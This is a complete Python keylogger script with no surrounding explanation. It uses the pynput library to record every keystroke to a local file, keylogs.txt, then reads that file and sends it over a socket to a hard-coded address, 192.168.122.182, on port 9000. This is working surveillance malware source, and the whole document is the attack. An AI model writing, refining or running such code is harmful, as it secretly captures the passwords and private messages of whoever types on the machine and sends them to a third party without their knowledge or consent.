from pynput import keyboard
import socket

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            f.write('{}\n'.format(key))
    except Exception as e:
        print("Error occurred while writing to file:", str(e))

def transmit_file():
    s = socket.socket()
    host = "192.168.122.182"
    port = 9000

    try:
        s.connect((host, port))
        with open('keylogs.txt', 'rb') as f:
            data = f.read(1024)
            while data:
                s.send(data)
                data = f.read(1024)
    except Exception as e:
        print("Error occurred while transmitting file:", str(e))
    finally:
        s.close()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

transmit_file()